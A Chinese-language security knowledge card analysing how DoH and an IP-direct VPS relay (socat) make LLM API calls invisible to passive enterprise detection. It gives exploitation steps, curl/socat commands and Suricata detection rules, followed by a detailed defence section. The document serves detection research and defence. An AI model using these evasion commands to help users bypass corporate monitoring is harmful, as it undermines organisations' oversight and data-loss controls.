---
id: defense-detection-llm-api-traffic-detection-bypass
title: 绕过内网 LLM API 流量检测：DoH 与 IP 直连前置代理令 DNS/SNI 特征消失
type: scenario
domain: defense
path: defense/detection
technique: llm-api-traffic-detection-evasion
aliases:
- Shadow AI 流量绕过
- LLM API 检测规避
- DoH 绕过 DNS 审计
- IP 直连代理消除 SNI
- SSE 流量指纹检测
tags:
- llm
- shadow-ai
- traffic-analysis
- suricata
- tls
- sni
- doh
- detection-evasion
- dlp
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:34:58+08:00'
  notes: 已对照全文与12张图核对：Suricata 8.0.6/tshark 4.6.4、四道闸门、4088包6条真阳性（图07：3 GATE1/1 GATE2/1 GATE3/1 GATE4）、2043包0误报、DoH 后仅 GATE2 命中、IP直连代理零告警（图08 B1=0）、域名连代理 8443 仍命中 GATE2、SSE 统计数值（231包/430B/15ms/3.3s；401/139/26/10.6；2170/1387/1/1.7；非流式8/820/163/1.1）均与原文一致。卡片已如实标注 ECH 未实测、样本单一、JA3 随版本变化；PoC 未本机复跑；无组件版本，未设 versions；frontmatter 无 sources/source_url。
---

## 一句话结论

在不解密 HTTPS 的旁路检测里，LLM API 调用会在 DNS、TLS SNI、JA3 指纹和 SSE 流式行为四层留下痕迹；但员工端只要用 DoH 加密 DNS、再把请求发给自己的 VPS 并用 **IP 直连**代理（SNI 按 RFC 6066 不能填 IP，客户端根本不发 SNI），DNS 与 SNI 两道闸门同时失效，Suricata 回放四道规则得到**零告警**；此时只剩 SSE 行为统计可兜底，而关闭流式输出即可连这层也躲开。

## 原理

一次典型的 LLM API 调用（如 `api.deepseek.com`）在协议栈上留下四类特征：

| 层 | 特征 | 失效条件 |
|---|---|---|
| DNS | 明文查询 `api.deepseek.com` | 客户端启用 DoH/DoT |
| TLS SNI | ClientHello 中明文域名 | ECH 或前置代理（IP 直连时不发 SNI） |
| TLS JA3/JA4 | 客户端 TLS 栈指纹（浏览器 vs Python/curl/wget 不同） | 模拟浏览器指纹或更换 TLS 栈 |
| HTTP | 明文内网服务路径（如 Ollama `/api/chat`） | 任何 HTTPS |
| SSE 行为 | 下行小包、毫秒级均匀间隔、持续数秒的"打字机"形态 | 不存在，只能被噪声淹没；非流式调用没有此形态 |

静态特征（DNS/SNI）查得准但都能被拆；行为特征拆不掉但阈值运营成本高。绕过实验的关键机制是：**SNI 扩展只能放域名，不能放 IP**（RFC 6066）。攻击者把请求发给 VPS 的 IP 而不是域名时，客户端不会发送 SNI；如果 VPS 用纯 TCP 中转（socat）转发到真实 API，DNS 查询也在 VPS 侧发生或直接硬编码 IP，本地网段看不到任何 LLM 域名痕迹。此时检测方只剩目的 IP 情报、陌生 SNI 基线以及 SSE 行为统计。

## 触发条件

- 企业只做旁路流量检测（镜像/NDR），不解密 HTTPS、不装终端插件；
- 检测规则依赖 DNS 域名、TLS SNI、JA3 指纹或明文 HTTP 路径；
- 员工能在终端运行脚本或使用自定义客户端，并能访问外部 VPS/代理；
- 代理支持纯 TCP 转发（不终止 TLS），或攻击者能控制代理的连接方式；
- 若检测方还部署了 SSE 行为统计，攻击者需要关闭流式输出（`stream=False`）或改变输出节奏。

## 利用步骤

1. **DoH 干掉 DNS 闸门**：客户端启用 DoH（如 `--doh-url https://doh.pub/dns-query`），本地网段的明文 DNS 查询里不再出现 `api.deepseek.com`，只剩对 DoH 服务器域名（如 `doh.pub`）的查询。注意：SNI 仍是 `api.deepseek.com`，单独用 DoH 只能绕过 DNS 规则。
2. **自建 VPS + 纯 TCP 中转**：在 VPS 上用 socat 监听 8443，转发到 `api.deepseek.com:443`；中转不终止 TLS，SNI 由客户端决定。
3. **用 IP 直连代理**：客户端请求 `https://<VPS_IP>:8443`。因为目标主机是 IP，TLS 客户端不会发送 SNI；同时本地不做 DNS 解析。回放检测规则：DNS 与 SNI 闸门均静默，实测四道闸门**零告警**。
4. **补齐应用层 Host**：TLS 隧道建立后，HTTP `Host` 头若仍是 `<VPS_IP>:8443`，上游 CDN/WAF 可能返回 418/403；显式设置 `Host: api.deepseek.com` 后请求成功。攻击者每多藏一层，请求就要多伪装一处。
5. **规避行为检测**：若检测方用 SSE 包长/间隔统计兜底，使用非流式调用（`stream=False`），响应只有少量包、持续时间短，统计上与普通 HTTPS 浏览无法区分；原文中非流式 DeepSeek 调用（8 个包、1.1 秒）被行为检测判为"普通"。
6. 用同一 pcap 回放验证各闸门命中情况，确认绕过是否完整。

## PoC

DoH 绕过 DNS（API 调用照常成功）：

```bash
curl -s --doh-url https://doh.pub/dns-query https://api.deepseek.com/ -o /dev/null
```

VPS 上的纯 TCP 中转：

```bash
socat TCP-LISTEN:8443,fork,reuseaddr TCP:api.deepseek.com:443
```

客户端 IP 直连代理（不发 SNI；Host 头补成真实域名）：

```bash
curl -k https://<VPS_IP>:8443/v1/chat/completions \
  -H 'Host: api.deepseek.com' \
  -H 'Content-Type: application/json' \
  -d '{"model":"deepseek-chat","stream":false,"messages":[{"role":"user","content":"hi"}]}'
```

检测侧对照（Suricata 8.0.6 规则，回放实验 pcap）：

```text
GATE1 DNS   : alert dns any any -> any any (msg:"LLM DNS"; dns.query; content:"api.deepseek.com"; nocase;)
GATE2 TLS   : alert tls any any -> any any (msg:"LLM SNI"; tls.sni; content:"api.deepseek.com"; nocase;)
GATE3 HTTP  : alert http any any -> any any (msg:"Ollama"; http.uri; content:"/api/chat"; startswith;)
GATE4 JA3   : alert tls any any -> any any (msg:"script-like"; ja3.hash; content:"<openai-httpx-ja3>";)
```

实测结果：

| 场景 | GATE1 DNS | GATE2 SNI | GATE4 JA3 | GATE3 HTTP | 告警数 |
|---|---|---|---|---|---|
| 正常直连 DeepSeek | 命中 | 命中 | 命中（同一连接） | — | 3 类 |
| DoH | 静默 | 命中 | 命中 | — | 1 |
| IP 直连 VPS 代理 | 静默 | 静默 | 可能命中（取决于客户端 TLS 栈） | — | **0** |
| 域名连 VPS 代理（hosts） | 静默 | 命中（8443 也命中） | 命中 | — | 1 |

误报对照：12 个主流站点 + 一次 pip 安装，2043 个包、34 条 DNS、14 条 TLS，规则告警 0。SSE 行为统计对照：DeepSeek 流式 231 包/均值 430B/间隔 15ms/3.3s 判为 LLM-SSE；Ollama 流式 401 包/139B/26ms/10.6s 判为 LLM-SSE；3MB 文件下载 2170 包/1387B/1ms/1.7s 判为下载；非流式 DeepSeek 8 包/820B/163ms/1.1s 判为普通。

说明：实验在隔离 VMware 网段完成，所有流量为自建；ECH 因客户端与服务端均未启用而未实测。

## 变体与关联

- 域名连代理：本地 hosts 把 `api.deepseek.com` 指到代理 IP，SNI 仍为真实域名，SNI 闸门照常命中；非标端口 8443 也拦不住按内容识别协议的 Suricata。
- 陌生 SNI：用 VPS 自己的域名连代理可避开针对已知 LLM 域名的规则，但会留下"新面孔域名"的 TLS 握手，对基线化企业网是可运营的告警点。
- ECH：理论上加密 SNI，彻底废掉 SNI 闸门；原文因环境不支持未实测，属于"未爆弹"。
- 行为层对抗：非流式、分块延迟、填充包、复用普通 HTTPS 长连接都可能改变 SSE 统计形态；行为检测的归因弱、阈值漂移，只能做兜底。
- 关联：域前置（现代公有云多已强制 SNI/Host 一致，基本失效）、DNS over HTTPS 审计、JA3/JA4 指纹、Shadow AI 数据外带、DLP 加密流量盲区。

## 检测与防御

- 分层建设，不押注单点：L1 资产盘点（LLM API 域名清单进 DNS/SNI 监控）；L2 静态规则（DNS/SNI/JA3/明文 HTTP）；L3 出口收敛（统一 LLM 网关，防火墙只放行网关到 LLM API，直连本身成为高价值告警）；L4 SSE 行为兜底（流级统计：下行包长均值/方差、包间隔均值、会话时长、上下行字节比），并持续校准阈值。
- 规则工程：Suricata 按内容识别协议，端口写 `any`；`startswith` 必须放在 `content` 之后，否则规则加载失败只留一行日志、检测面悄悄缺失；上线前核对规则加载清单；子串匹配 `api.deepseek.com` 会连坐 CNAME 链，也会带来理论上的撞库风险，需配合域名边界与白名单。
- 监控 DoH：终端直连公共 DoH 服务器本身就是异常行为；可在 DNS 出口强制内部解析器、封禁已知公共 DoH 端点。
- 监控代理基础设施：目的 IP 情报（IDC/代理标签）、陌生 SNI 基线、TLS 指纹白名单（脚本型客户端是少数派）、SSE 与非流式调用的比例。
- 认识到盲区：不解密 HTTPS 时，IP 直连代理 + 非流式调用可以同时躲开 DNS、SNI 和行为三层；终端侧 EDR/代理、出口白名单与统一网关才是治本手段。
- 局限：原文规则针对 DeepSeek 与 Ollama，JA3 哈希随客户端库版本变化；SSE 阈值来自小样本（每类 1–2 条流），跨网络抖动与模型后端需要重新校准；ECH 未实测。

## 备注

- 原始实验为授权隔离环境（192.168.3.0/24），未涉及第三方目标；本卡只保留机制与最小命令，不含任何密钥。
- confidence 定为 medium：机制与回放结果明确，但样本为单一实验环境、Suricata 8.0.6、少量 pcap，跨环境泛化未验证。
- affected_versions 未填写：不针对具体产品版本。
